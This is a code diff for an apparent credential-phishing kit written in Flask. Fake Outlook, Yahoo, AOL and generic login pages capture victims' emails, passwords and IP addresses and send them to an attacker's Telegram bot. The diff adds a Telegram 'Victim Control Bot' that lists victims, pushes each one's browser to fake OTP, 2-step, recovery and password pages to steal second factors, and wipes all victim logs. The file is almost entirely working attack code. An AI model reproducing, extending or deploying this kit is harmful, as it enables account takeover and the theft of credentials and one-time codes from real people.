-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            message = f"""
-🔐 <b>ADMIN LOGIN DETECTED!</b>
-
-👤 <b>Username:</b> <code>{username}</code>
-🌐 <b>IP Address:</b> <code>{client_ip}</code>
-🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Action:</b> Logged into Admin Panel
-
-✅ <b>Admin authentication successful</b>
-            """
-            send_telegram_message(message)
-            
-            return jsonify({'success': True})
-        else:
-            # Log failed attempt
-            client_ip = get_client_ip()
-            print(f"🚫 Failed admin login attempt from IP: {client_ip}")
-            
-            # Send Telegram notification for failed attempt
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            message = f"""
-🚫 <b>FAILED ADMIN LOGIN ATTEMPT!</b>
-
-👤 <b>Username Attempted:</b> <code>{username}</code>
-🌐 <b>IP Address:</b> <code>{client_ip}</code>
-🕒 <b>Time:</b> <code>{timestamp}</code>
-❌ <b>Status:</b> Invalid credentials
-
-⚠️ <b>Security alert - unauthorized access attempt</b>
-            """
-            send_telegram_message(message)
-            
-            return jsonify({'success': False, 'error': 'Invalid username or password'})
-    
-    # GET request - show login page
-    return render_template('loginpanel.html')
-
-@app.route('/admin-logout')
-def admin_logout():
-    """Admin logout"""
-    if session.get('admin_logged_in'):
-        username = session.get('admin_username', 'Unknown')
-        client_ip = get_client_ip()
+            return jsonify({'status': 'ok'})
         
-        # Send logout notification
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        message = f"""
-🔒 <b>ADMIN LOGGED OUT</b>
+        if 'message' in data:
+            message = data['message']
+            chat_id = message['chat']['id']
+            text = message.get('text', '').strip()
+            
+            if text == '/start' or text == '🔙 Main Menu':
+                send_main_menu(chat_id)
+            elif text == '📋 View Victims':
+                send_victims_list(chat_id)
+            elif text == '📊 Statistics':
+                send_stats(chat_id)
+            elif text == '🧹 Clear All':
+                send_clear_confirmation(chat_id)
+            else:
+                send_main_menu(chat_id)
+        
+        return jsonify({'status': 'ok'})
+        
+    except Exception as e:
+        print(f"Error in webhook: {e}")
+        return jsonify({'status': 'error'}), 500
 
-👤 <b>Username:</b> <code>{username}</code>
-🌐 <b>IP Address:</b> <code>{client_ip}</code>
-🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Action:</b> Logged out from Admin Panel
+def send_main_menu(chat_id, message_id=None):
+    keyboard = {
+        "inline_keyboard": [
+            [
+                {"text": "📋 View Victims", "callback_data": "victims_list"},
+                {"text": "📊 Statistics", "callback_data": "stats"}
+            ],
+            [
+                {"text": "🧹 Clear All Data", "callback_data": "clear_all"}
+            ],
+            [
+                {"text": "🔄 Refresh", "callback_data": "refresh"}
+            ]
+        ]
+    }
+    
+    text = """🤖 <b>Victim Control Bot</b>
 
-✅ <b>Admin session ended</b>
-        """
-        send_telegram_message(message)
-    
-    # Clear admin session
-    session.pop('admin_logged_in', None)
-    session.pop('admin_username', None)
-    
-    return redirect('/admin-login')
+Welcome! Use the buttons below to control your victims.
 
-def admin_required(f):
-    """Decorator to require admin authentication"""
-    @wraps(f)
-    def decorated_function(*args, **kwargs):
-        if not session.get('admin_logged_in'):
-            # Return JSON error for API routes
-            if request.path.startswith('/api/'):
-                return jsonify({'error': 'Unauthorized'}), 401
-            # Redirect for HTML routes
-            return redirect('/admin-login')
-        return f(*args, **kwargs)
-    return decorated_function
+📋 <b>View Victims</b> - See all active victims
+📊 <b>Statistics</b> - View stats
+🧹 <b>Clear All</b> - Delete all victims & logs
+🔄 <b>Refresh</b> - Update the list"""
+    
+    if message_id:
+        edit_telegram_message(chat_id, message_id, text, keyboard)
+    else:
+        send_telegram_message_with_buttons(chat_id, text, keyboard)
 
-@app.route('/panel')
-@admin_required
-def panel():
-    """Control panel - accessible directly from Telegram"""
-    return render_template('panel.html')
-
-@app.route('/api/get-victims')
-@admin_required
-def get_victims():
-    """Get all active victims with current status - OPTIMIZED"""
-    conn = get_db_connection()
-    c = conn.cursor()
+def send_victims_list(chat_id, message_id=None):
+    victims = get_all_victims()
     
-    # 🚨 OPTIMIZED QUERY - FIXED N+1 PROBLEM
-    c.execute('''
-        SELECT 
-            v.session_id, 
-            v.email, 
-            v.ip_address, 
-            v.current_page, 
-            v.timestamp,
-            (SELECT COUNT(*) FROM navigations n WHERE n.session_id = v.session_id) as nav_count,
-            (SELECT MAX(timestamp) FROM navigations n WHERE n.session_id = v.session_id) as last_activity
-        FROM victims v 
-        WHERE v.is_active = TRUE
-        ORDER BY v.timestamp DESC
-        LIMIT 50  -- 🚨 ADD LIMIT FOR PERFORMANCE
-    ''')
-    victims = c.fetchall()
-    
-    conn.close()
-    
-    return jsonify({
-        'victims': [{
-            'session_id': v[0],
-            'email': v[1] or 'No email yet',
-            'ip_address': v[2],
-            'current_page': v[3] or 'login',
-            'timestamp': v[4],
-            'nav_count': v[5] or 0,
-            'last_activity': v[6]
-        } for v in victims]
-    })
-
-@app.route('/api/victim-navigations/<session_id>')
-@admin_required
-def get_victim_navigations(session_id):
-    """Get navigations for a specific victim"""
-    conn = get_db_connection()
-    c = conn.cursor()
-    
-    c.execute("SELECT * FROM navigations WHERE session_id = %s ORDER BY timestamp DESC LIMIT 20", (session_id,))
-    navigations = c.fetchall()
-    
-    c.execute("SELECT * FROM victims WHERE session_id = %s", (session_id,))
-    victim = c.fetchone()
-    
-    conn.close()
-    
-    return jsonify({
-        'victim': {
-            'id': victim[0],
-            'email': victim[1],
-            'ip_address': victim[2],
-            'user_agent': victim[3],
-            'session_id': victim[4],
-            'current_page': victim[5],
-            'is_active': victim[6],
-            'timestamp': victim[7]
-        } if victim else None,
-        'navigations': [{
-            'id': nav[0],
-            'session_id': nav[1],
-            'email': nav[2],
-            'ip_address': nav[3],
-            'page_url': nav[4],
-            'timestamp': nav[5]
-        } for nav in navigations]
-    })
-
-@app.route('/api/control-victim', methods=['POST'])
-@admin_required
-def control_victim():
-    """Control victim navigation"""
-    data = request.get_json()
-    session_id = data.get('session_id')
-    action = data.get('action')
-    
-    if session_id:
-        # Map actions to page names
-        action_to_page = {
-            'go_to_waiting': 'waiting',
-            'go_to_login': 'gmail_login',
-            'go_to_stall': 'stall',
-            'go_to_verify': 'verify',
-            'go_to_password': 'password',
-            'go_to_reset': 'reset',
-            'go_to_otp': 'otp',
-            'go_to_invalid': 'invalid',
-            'go_to_recovery': 'recovery',
-            'go_to_2step': 'twostep'
+    if not victims:
+        text = "📭 <b>No active victims found.</b>"
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔄 Refresh", "callback_data": "refresh"}],
+                [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
+            ]
         }
+    else:
+        text = f"📋 <b>Active Victims ({len(victims)})</b>\n\n"
+        keyboard = {"inline_keyboard": []}
         
-        if action in action_to_page:
-            page_name = action_to_page[action]
+        for v in victims[:10]:
+            session_short = v['session_id'][:8]
+            text += f"🆔 <code>{session_short}...</code>\n"
+            text += f"📧 {v['email']}\n"
+            text += f"📍 {v['current_page']}\n"
+            text += "─" * 20 + "\n"
             
-            # Store command
-            victim_commands[session_id] = action
-            update_victim_page(session_id, page_name)
-            
-            ip_address = active_victims.get(session_id, {}).get('ip_address', 'Unknown')
-            send_telegram_message(f"🔄 <b>Command Sent:</b> Victim forced to {page_name.replace('_', ' ').title()} Page\n🌐 <b>IP:</b> <code>{ip_address}</code>")
+            keyboard["inline_keyboard"].append([
+                {"text": f"👤 {session_short}", "callback_data": f"victim_detail|{v['session_id']}"}
+            ])
+        
+        if len(victims) > 10:
+            text += f"\n... and {len(victims) - 10} more victims"
+        
+        keyboard["inline_keyboard"].append([
+            {"text": "🔄 Refresh", "callback_data": "refresh"},
+            {"text": "🔙 Main Menu", "callback_data": "main_menu"}
+        ])
     
-    return jsonify({'success': True})
+    if message_id:
+        edit_telegram_message(chat_id, message_id, text, keyboard)
+    else:
+        send_telegram_message_with_buttons(chat_id, text, keyboard)
 
-@app.route('/api/delete-victim', methods=['POST'])
-@admin_required
-def delete_victim():
-    """Delete victim"""
-    data = request.get_json()
-    session_id = data.get('session_id')
+def send_victim_detail(chat_id, session_id, message_id=None):
+    victim = get_victim_details(session_id)
+    
+    if not victim:
+        text = "❌ Victim not found"
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "📋 Back to Victims", "callback_data": "victims_list"}],
+                [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
+            ]
+        }
+    else:
+        text = f"""👤 <b>Victim Details</b>
+
+🆔 <b>Session:</b> <code>{victim['session_id']}</code>
+📧 <b>Email:</b> {victim['email']}
+📍 <b>Current Page:</b> {victim['current_page']}
+🌐 <b>IP:</b> {victim['ip_address']}
+📱 <b>Device:</b> {victim['user_agent'][:40]}...
+🕐 <b>Connected:</b> {victim['timestamp']}
+📊 <b>Navigations:</b> {victim['nav_count']}
+
+<b>Control Options:</b>"""
+        
+        keyboard = {
+            "inline_keyboard": [
+                [
+                    {"text": "🔄 Waiting", "callback_data": f"force|{session_id}|waiting"},
+                    {"text": "🔐 Login", "callback_data": f"force|{session_id}|login"}
+                ],
+                [
+                    {"text": "⏸️ Stall", "callback_data": f"force|{session_id}|stall"},
+                    {"text": "🔑 Password", "callback_data": f"force|{session_id}|password"}
+                ],
+                [
+                    {"text": "🛡️ Verify", "callback_data": f"force|{session_id}|verify"},
+                    {"text": "🔄 Reset", "callback_data": f"force|{session_id}|reset"}
+                ],
+                [
+                    {"text": "📱 OTP", "callback_data": f"force|{session_id}|otp"},
+                    {"text": "❌ Invalid", "callback_data": f"force|{session_id}|invalid"}
+                ],
+                [
+                    {"text": "📱 Recovery", "callback_data": f"force|{session_id}|recovery"},
+                    {"text": "🔒 2-Step", "callback_data": f"force|{session_id}|2step"}
+                ],
+                [
+                    {"text": "📧 Set Email", "callback_data": f"setemail|{session_id}|"},
+                    {"text": "🗑️ Delete", "callback_data": f"delete|{session_id}"}
+                ],
+                [
+                    {"text": "📱 Set Phone Type", "callback_data": f"setphonetype|{session_id}|"},
+                    {"text": "📞 Set Phone", "callback_data": f"setphone|{session_id}|"}
+                ],
+                [
+                    {"text": "🔢 Set Number", "callback_data": f"setnumber|{session_id}|"}
+                ],
+                [
+                    {"text": "📋 Back to Victims", "callback_data": "victims_list"},
+                    {"text": "🔙 Main Menu", "callback_data": "main_menu"}
+                ]
+            ]
+        }
+    
+    if message_id:
+        edit_telegram_message(chat_id, message_id, text, keyboard)
+    else:
+        send_telegram_message_with_buttons(chat_id, text, keyboard)
+
+def force_victim(session_id, page, chat_id, message_id):
+    action_map = {
+        'waiting': 'go_to_waiting',
+        'login': 'go_to_login',
+        'stall': 'go_to_stall',
+        'verify': 'go_to_verify',
+        'password': 'go_to_password',
+        'reset': 'go_to_reset',
+        'otp': 'go_to_otp',
+        'invalid': 'go_to_invalid',
+        'recovery': 'go_to_recovery',
+        '2step': 'go_to_2step'
+    }
+    
+    if page in action_map:
+        victim_commands[session_id] = action_map[page]
+        text = f"✅ Victim forced to <b>{page}</b> page!"
+    else:
+        text = f"❌ Invalid page: {page}"
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
+            [{"text": "📋 Victims List", "callback_data": "victims_list"}],
+            [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
+        ]
+    }
+    
+    edit_telegram_message(chat_id, message_id, text, keyboard)
+
+def set_victim_email(session_id, email, chat_id, message_id):
+    if not email:
+        text = "📧 Please type the email address you want to set.\n\nExample: user@gmail.com"
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
+            ]
+        }
+        edit_telegram_message(chat_id, message_id, text, keyboard)
+        return
     
     conn = get_db_connection()
     c = conn.cursor()
-    
-    # Get victim info before deleting
-    c.execute("SELECT email, ip_address FROM victims WHERE session_id = %s", (session_id,))
-    victim = c.fetchone()
-    
-    if victim:
-        email, ip_address = victim
-        
-        # Deactivate victim
-        c.execute("UPDATE victims SET is_active = FALSE WHERE session_id = %s", (session_id,))
-        
-        # Send Telegram notification
-        send_telegram_message(f"🗑️ <b>Victim Deleted:</b>\n📧 <b>Email:</b> <code>{email or 'No email'}</code>\n🌐 <b>IP:</b> <code>{ip_address}</code>")
-    
+    c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
     conn.commit()
     conn.close()
     
-    # Remove from active victims and commands
+    if session_id in active_victims:
+        active_victims[session_id]['email'] = email
+    
+    text = f"✅ Email set to: <code>{email}</code>"
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
+            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
+        ]
+    }
+    edit_telegram_message(chat_id, message_id, text, keyboard)
+
+def set_victim_phonetype(session_id, phone_type, chat_id, message_id):
+    if not phone_type:
+        text = "📱 Please type the phone type you want to set.\n\nExamples: iPhone, Android, Samsung, Oppo, etc."
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
+            ]
+        }
+        edit_telegram_message(chat_id, message_id, text, keyboard)
+        return
+    
+    if session_id not in verification_page_data:
+        verification_page_data[session_id] = {}
+    verification_page_data[session_id]['phone'] = phone_type
+    
+    text = f"✅ Phone type set to: <code>{phone_type}</code>"
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
+            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
+        ]
+    }
+    edit_telegram_message(chat_id, message_id, text, keyboard)
+
+def set_victim_number(session_id, number, chat_id, message_id):
+    if not number:
+        text = "🔢 Please type a 2-digit number (00-99).\n\nExample: 42"
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
+            ]
+        }
+        edit_telegram_message(chat_id, message_id, text, keyboard)
+        return
+    
+    if not re.match(r'^[0-9]{2}$', number):
+        text = "❌ Invalid number. Must be 2 digits (00-99). Please try again."
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
+            ]
+        }
+        edit_telegram_message(chat_id, message_id, text, keyboard)
+        return
+    
+    if session_id not in recovery_page_data:
+        recovery_page_data[session_id] = {}
+    recovery_page_data[session_id]['number'] = number
+    
+    text = f"✅ Number set to: <code>{number}</code>"
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
+            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
+        ]
+    }
+    edit_telegram_message(chat_id, message_id, text, keyboard)
+
+def set_victim_phone(session_id, phone, chat_id, message_id):
+    if not phone:
+        text = "📞 Please type the phone number you want to set.\n\nExample: +1234567890"
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
+            ]
+        }
+        edit_telegram_message(chat_id, message_id, text, keyboard)
+        return
+    
+    if session_id not in verify_page_data:
+        verify_page_data[session_id] = {}
+    verify_page_data[session_id]['phone'] = phone
+    
+    text = f"✅ Phone set to: <code>{phone}</code>"
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
+            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
+        ]
+    }
+    edit_telegram_message(chat_id, message_id, text, keyboard)
+
+def delete_victim_telegram(session_id, chat_id, message_id):
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute("UPDATE victims SET is_active = FALSE WHERE session_id = %s", (session_id,))
+    conn.commit()
+    conn.close()
+    
     if session_id in active_victims:
         del active_victims[session_id]
     if session_id in victim_commands:
         del victim_commands[session_id]
     
-    return jsonify({'success': True})
-# ============ OUTLOOK (MICROSOFT) ROUTES ============
+    text = f"🗑️ Victim <code>{session_id[:8]}...</code> deleted!"
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "📋 Victims List", "callback_data": "victims_list"}],
+            [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
+        ]
+    }
+    edit_telegram_message(chat_id, message_id, text, keyboard)
+
+def send_stats(chat_id, message_id=None):
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute("SELECT COUNT(*) FROM victims WHERE is_active = TRUE")
+    active_count = c.fetchone()[0]
+    c.execute("SELECT COUNT(*) FROM victims")
+    total_count = c.fetchone()[0]
+    c.execute("SELECT COUNT(*) FROM navigations")
+    nav_count = c.fetchone()[0]
+    conn.close()
+    
+    text = f"""📊 <b>Statistics</b>
+
+👤 <b>Active Victims:</b> {active_count}
+📋 <b>Total Victims:</b> {total_count}
+🗺️ <b>Total Navigations:</b> {nav_count}
+⚡ <b>Active Commands:</b> {len(victim_commands)}"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔄 Refresh", "callback_data": "stats"}],
+            [{"text": "📋 Victims List", "callback_data": "victims_list"}],
+            [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
+        ]
+    }
+    
+    if message_id:
+        edit_telegram_message(chat_id, message_id, text, keyboard)
+    else:
+        send_telegram_message_with_buttons(chat_id, text, keyboard)
+
+def clear_all_victims(chat_id, message_id):
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute("DELETE FROM navigations")
+    c.execute("DELETE FROM victims")
+    c.execute("ALTER SEQUENCE victims_id_seq RESTART WITH 1")
+    c.execute("ALTER SEQUENCE navigations_id_seq RESTART WITH 1")
+    conn.commit()
+    conn.close()
+    
+    active_victims.clear()
+    victim_commands.clear()
+    verify_page_data.clear()
+    recovery_page_data.clear()
+    verification_page_data.clear()
+    
+    text = "🧹 <b>ALL VICTIMS AND LOGS CLEARED!</b>"
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "📋 Victims List", "callback_data": "victims_list"}],
+            [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
+        ]
+    }
+    edit_telegram_message(chat_id, message_id, text, keyboard)
+
+def send_clear_confirmation(chat_id):
+    text = "⚠️ <b>ARE YOU SURE?</b>\n\nThis will delete ALL victim data and navigation logs!\n\nThis action cannot be undone!"
+    keyboard = {
+        "inline_keyboard": [
+            [
+                {"text": "✅ Yes, Clear All", "callback_data": "clear_all"},
+                {"text": "❌ Cancel", "callback_data": "main_menu"}
+            ]
+        ]
+    }
+    send_telegram_message_with_buttons(chat_id, text, keyboard)
+
+def send_telegram_message_with_buttons(chat_id, text, keyboard):
+    try:
+        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
+        if not chat_id:
+            return False
+        
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": chat_id,
+            "text": text,
+            "parse_mode": "HTML",
+            "reply_markup": json.dumps(keyboard)
+        }
+        response = requests.post(url, data=data)
+        return response.status_code == 200
+    except Exception as e:
+        print(f"Error sending Telegram message: {e}")
+        return False
+
+def edit_telegram_message(chat_id, message_id, text, keyboard):
+    try:
+        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
+        if not chat_id:
+            return False
+        
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
+        data = {
+            "chat_id": chat_id,
+            "message_id": message_id,
+            "text": text,
+            "parse_mode": "HTML",
+            "reply_markup": json.dumps(keyboard)
+        }
+        response = requests.post(url, data=data)
+        return response.status_code == 200
+    except Exception as e:
+        print(f"Error editing Telegram message: {e}")
+        return False
+
+def get_all_victims():
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute('''
+        SELECT session_id, email, ip_address, current_page, timestamp 
+        FROM victims 
+        WHERE is_active = TRUE 
+        ORDER BY timestamp DESC
+        LIMIT 50
+    ''')
+    victims = c.fetchall()
+    conn.close()
+    
+    return [{
+        'session_id': v[0],
+        'email': v[1] or 'No email',
+        'ip_address': v[2],
+        'current_page': v[3] or 'login',
+        'timestamp': v[4]
+    } for v in victims]
+
+def get_victim_details(session_id):
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute('''
+        SELECT v.session_id, v.email, v.ip_address, v.user_agent, v.current_page, v.timestamp,
+               COUNT(n.id) as nav_count
+        FROM victims v
+        LEFT JOIN navigations n ON v.session_id = n.session_id
+        WHERE v.session_id = %s AND v.is_active = TRUE
+        GROUP BY v.session_id, v.email, v.ip_address, v.user_agent, v.current_page, v.timestamp
+    ''', (session_id,))
+    victim = c.fetchone()
+    conn.close()
+    
+    if victim:
+        return {
+            'session_id': victim[0],
+            'email': victim[1] or 'No email',
+            'ip_address': victim[2],
+            'user_agent': victim[3],
+            'current_page': victim[4] or 'login',
+            'timestamp': victim[5],
+            'nav_count': victim[6]
+        }
+    return None
+
+# ============ PROVIDER ROUTES ============
 @app.route('/wp-admin/invite<int:invite_num>/hotmail/', methods=['GET', 'POST'])
 def microsoft_login(invite_num):
     if request.method == 'POST':
         email = request.form.get('email', 'Not provided')
         session['user_email'] = email
         
-        # Get victim session
         session_id = session.get('victim_session')
         if session_id:
-            # Update victim with email in database
             conn = get_db_connection()
             c = conn.cursor()
             c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
             conn.commit()
             conn.close()
             
-            # Update active victims
             if session_id in active_victims:
                 active_victims[session_id]['email'] = email
         
-        # Send Telegram notification
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 📧 <b>Outlook Email Entered!</b>
@@ -1353,8 +1396,6 @@ def microsoft_login(invite_num):
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Page:</b> Outlook Login
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
         """
         send_telegram_message(message)
         
@@ -1371,9 +1412,7 @@ def microsoft_password(invite_num):
         password = request.form.get('password', 'Not provided')
         email = request.form.get('email', 'Not provided')
         
-        # Send Telegram notification
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔑 <b>Outlook Password Entered!</b>
@@ -1382,8 +1421,6 @@ def microsoft_password(invite_num):
 🔐 <b>Password:</b> <code>{password}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
         """
         send_telegram_message(message)
         
@@ -1396,14 +1433,12 @@ def microsoft_password(invite_num):
 def microsoft_403(invite_num):
     return render_template('403.html', invite_num=invite_num)
 
-# ============ YAHOO ROUTES ============
 @app.route('/wp-admin/invite<int:invite_num>/yahoo/', methods=['GET', 'POST'])
 def yahoo_login(invite_num):
     if request.method == 'POST':
         email = request.form.get('email', 'Not provided')
         session['yahoo_email'] = email
         
-        # Get victim session
         session_id = session.get('victim_session')
         if session_id:
             conn = get_db_connection()
@@ -1415,9 +1450,7 @@ def yahoo_login(invite_num):
             if session_id in active_victims:
                 active_victims[session_id]['email'] = email
         
-        # Send Telegram notification
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 📧 <b>Yahoo Email/Username Entered!</b>
@@ -1426,8 +1459,6 @@ def yahoo_login(invite_num):
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Page:</b> Yahoo Login
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
         """
         send_telegram_message(message)
         
@@ -1445,7 +1476,6 @@ def yahoo_password(invite_num):
         email = request.form.get('email', 'Not provided')
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔑 <b>Yahoo Password Entered!</b>
@@ -1454,8 +1484,6 @@ def yahoo_password(invite_num):
 🔐 <b>Password:</b> <code>{password}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
         """
         send_telegram_message(message)
         
@@ -1468,7 +1496,6 @@ def yahoo_password(invite_num):
 def yahoo_403(invite_num):
     return render_template('403.html', invite_num=invite_num)
 
-# ============ AOL ROUTES ============
 @app.route('/wp-admin/invite<int:invite_num>/aol/', methods=['GET', 'POST'])
 def aol_login(invite_num):
     if request.method == 'POST':
@@ -1487,7 +1514,6 @@ def aol_login(invite_num):
                 active_victims[session_id]['email'] = email
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 📧 <b>AOL Email Entered!</b>
@@ -1496,8 +1522,6 @@ def aol_login(invite_num):
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Page:</b> AOL Login
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
         """
         send_telegram_message(message)
         
@@ -1515,7 +1539,6 @@ def aol_password(invite_num):
         email = request.form.get('email', 'Not provided')
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔑 <b>AOL Password Entered!</b>
@@ -1524,8 +1547,6 @@ def aol_password(invite_num):
 🔐 <b>Password:</b> <code>{password}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
         """
         send_telegram_message(message)
         
@@ -1538,7 +1559,6 @@ def aol_password(invite_num):
 def aol_403(invite_num):
     return render_template('403.html', invite_num=invite_num)
 
-# ============ OTHER ROUTES ============
 @app.route('/wp-admin/invite<int:invite_num>/other/', methods=['GET', 'POST'])
 def other_login(invite_num):
     if request.method == 'POST':
@@ -1557,7 +1577,6 @@ def other_login(invite_num):
                 active_victims[session_id]['email'] = email
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        panel_url = f"{request.host_url.rstrip('/')}/panel"
         
         message = f"""
 🔑 <b>Other Login Attempt!</b>
@@ -1566,8 +1585,6 @@ def other_login(invite_num):
 🔐 <b>Password:</b> <code>{password}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
-
-🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
         """
         send_telegram_message(message)
         
@@ -1579,42 +1596,23 @@ def other_login(invite_num):
 @app.route('/wp-admin/invite<int:invite_num>/other/403')
 def other_403(invite_num):
     return render_template('403.html', invite_num=invite_num)
-@app.route('/api/clear-all-logs', methods=['POST'])
-@admin_required
-def clear_all_logs():
-    """Clear ALL victim data and logs"""
+
+def setup_telegram_webhook():
+    """Set the Telegram webhook URL"""
     try:
-        conn = get_db_connection()
-        c = conn.cursor()
-        
-        # Delete all data from tables
-        c.execute("DELETE FROM navigations")
-        c.execute("DELETE FROM victims")
-        
-        # Reset sequences (for PostgreSQL)
-        c.execute("ALTER SEQUENCE victims_id_seq RESTART WITH 1")
-        c.execute("ALTER SEQUENCE navigations_id_seq RESTART WITH 1") 
-        
-        conn.commit()
-        conn.close()
-        
-        # Clear in-memory data
-        active_victims.clear()
-        victim_commands.clear()
-        verify_page_data.clear()
-        recovery_page_data.clear()
-        verification_page_data.clear()
-        
-        # Send Telegram notification
-        send_telegram_message("🗑️ <b>ALL LOGS CLEARED!</b>\n\n📊 <b>All victim data has been wiped clean</b>\n🔄 <b>System reset to initial state</b>")
-        
-        return jsonify({'success': True, 'message': 'All logs cleared successfully'})
-        
+        domain = os.environ.get('DOMAIN_URL', 'https://bace-w3pt.onrender.com')
+        webhook_url = f"{domain}/telegram-webhook"
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook?url={webhook_url}"
+        response = requests.get(url)
+        print(f"Webhook setup: {response.text}")
     except Exception as e:
-        print(f"Error clearing logs: {e}")
-        return jsonify({'success': False, 'error': str(e)})
+        print(f"Error setting webhook: {e}")
 
 if __name__ == '__main__':
+    if not os.environ.get('WERKZEUG_RUN_MAIN'):
+        send_telegram_message("✅ Server started!")
+        setup_telegram_webhook()
+    
     app.run(
         host='0.0.0.0', 
         port=5000,
